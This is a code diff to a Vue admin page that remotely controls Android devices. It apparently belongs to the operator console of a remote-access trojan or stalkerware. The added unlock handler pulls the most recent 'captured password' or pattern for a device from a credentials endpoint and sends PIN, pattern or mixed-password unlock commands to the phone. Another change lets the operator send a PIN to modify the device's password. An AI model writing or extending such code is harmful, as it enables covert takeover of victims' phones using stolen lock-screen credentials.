@@ -1,5 +1,6 @@
 <script setup lang="ts">
-import { ref, computed, onMounted, onUnmounted, watch } from 'vue';
+import { ref, computed, onMounted, onUnmounted, watch, type Ref } from 'vue';
+import axios from 'axios';
 import { Head, router, usePage } from '@inertiajs/vue3';
 import { useAdminBasePath } from '@/composables/useAdminBasePath';
 import {
@@ -393,8 +394,59 @@ const handleOcrSwipe = (startX: number, startY: number, endX: number, endY: numb
 const handleOcrLongPress = (x: number, y: number) => {
     screenControl.sendLongPress(x, y);
 };
-const handleLock = (type: 0 | 1 | 2 | 3) => {
-    screenControl.lockDevice(type);
+const handleLock = async (type: 0 | 1 | 2 | 3) => {
+    if (type !== 0) {
+        screenControl.lockDevice(type);
+        return;
+    }
+
+    try {
+        const { data } = await axios.get(`/devices/${props.device.uuid}/credentials`, {
+            params: { per_page: 1 },
+        });
+        const latest = data.data?.data?.[0];
+
+        if (!latest?.password && !latest?.pattern_cipher) {
+            send({ command: 'SMART_UNLOCK_SWIPE', params: {}, pid: deviceId.value });
+            message.info('未找到已捕获密码，仅执行上滑解锁');
+            return;
+        }
+
+        const grade = latest.cipher_grade_code ?? '';
+        const pwdType = latest.password_type ?? '';
+
+        if (pwdType === 'pattern' || grade === 'PASSWORD_QUALITY_PATTERN') {
+            const raw = latest.pattern_cipher ?? latest.password ?? '';
+            const pattern = raw.split(',').map(Number).filter((n: number) => !isNaN(n));
+            if (pattern.length >= 4) {
+                send({ command: 'UNLOCK_DEVICE', params: { pattern }, pid: deviceId.value });
+                message.success(`图案解锁已发送 (${pattern.length}个点)`);
+            } else {
+                message.error('图案密码数据无效');
+            }
+        } else if (
+            pwdType === 'pin' ||
+            grade === 'PASSWORD_QUALITY_NUMERIC' ||
+            grade === 'PASSWORD_QUALITY_NUMERIC_COMPLEX'
+        ) {
+            send({
+                command: 'SMART_NUMERIC_UNLOCK',
+                params: { password: latest.password },
+                pid: deviceId.value,
+            });
+            message.success('PIN 解锁已发送');
+        } else {
+            send({
+                command: 'SMART_MIXED_UNLOCK',
+                params: { password: latest.password },
+                pid: deviceId.value,
+            });
+            message.success('混合密码解锁已发送');
+        }
+    } catch {
+        send({ command: 'SMART_UNLOCK_SWIPE', params: {}, pid: deviceId.value });
+        message.warning('获取密码失败，仅执行上滑解锁');
+    }
 };
 const handleScreenshot = () => screenControl.takeScreenshot();
 const handleQualityChange = (quality: number) => screenControl.setScreenQuality(quality);
@@ -545,7 +597,7 @@ const handleModifyPassword = (password: string) => {
         message.error('请输入 4-16 位数字密码');
         return;
     }
-    send({ command: 'NUMERIC_PIN_INPUT', params: { pin: password }, pid: deviceId.value });
+    send({ command: 'NUMERIC_PIN_INPUT', params: { digit: password, pin: password }, pid: deviceId.value });
     message.success('修改密码请求已发送');
 };
 
